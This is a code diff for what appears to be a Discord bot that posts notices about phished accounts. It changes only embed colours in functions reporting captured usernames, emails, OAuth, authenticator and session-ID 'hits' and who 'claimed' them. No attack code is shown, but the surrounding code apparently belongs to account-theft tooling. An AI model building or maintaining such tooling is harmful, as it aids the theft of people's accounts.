@@ -306,7 +306,7 @@ async function secEmailMessager(client, guildId, channelId, interaction, id, mcn
         }
 
         let embedData = {
-            color: 11716576,
+            color: 16097035,
             fields: [
                 {
                     name: "Username | Email | Status",
@@ -376,7 +376,7 @@ async function oauthMessager(client, guildId, channelId, interaction, mcname, em
         const embedMessage = {
             embeds: [
                 {
-                    color: 11716576,
+                    color: 16097035,
                     fields: [
                         {
                             name: "Username | Email | Status",
@@ -553,7 +553,7 @@ async function AuthenticatorMessager(client, guildId, channelId, interaction, mc
         const embedMessage = {
             embeds: [
                 {
-                    color: 11716576,
+                    color: 16097035,
                     fields: [
                         {
                             name: "Username | Email | Status",
@@ -830,7 +830,7 @@ async function splitmessager(client, guildId, channelId, interaction, mcname, d 
         const embedMessage = {
             embeds: [
                 {
-                    color: 11716576,
+                    color: 16097035,
                     fields: [
                         {
                             name: "Username | Email | Status",
@@ -1030,7 +1030,7 @@ async function splitClaimMessager(client, guildId, channelId, interaction, name,
                     `**IGN** \`${name}\`\n` +
                     `**Progress** \`${claimstreak}/${split}\`\n` +
                     resultText,
-                color: 0xADD8E6
+                color: 0xF59E0B
             }]
         });
     } catch (e) {
@@ -1046,7 +1046,7 @@ async function claimHitMessager(client, guildId, chanelId, interaction, mode, na
                 embeds: [{
                     title: `Someone claimed a hit!`,
                     description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`Full Claiming\``,
-                    color: 0xADD8E6
+                    color: 0xF59E0B
                 }]
             });
         } catch (e) {
@@ -1058,7 +1058,7 @@ async function claimHitMessager(client, guildId, chanelId, interaction, mode, na
                 embeds: [{
                     title: `Someone claimed a hit!`,
                     description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`SSID Claiming\`\n**IGN** \`${name}\``,
-                    color: 0xADD8E6
+                    color: 0xF59E0B
                 }]
             });
         } catch (e) {
@@ -1070,7 +1070,7 @@ async function claimHitMessager(client, guildId, chanelId, interaction, mode, na
                 embeds: [{
                     title: `Someone claimed a hit!`,
                     description: `**User** \`${interaction.user.username}\`\n**ID** \`${interaction.user.id}\`\n**Mode** \`Nothing Claiming\`\n**IGN** \`${name}\``,
-                    color: 0xADD8E6
+                    color: 0xF59E0B
                 }]
             });
         } catch (e) {
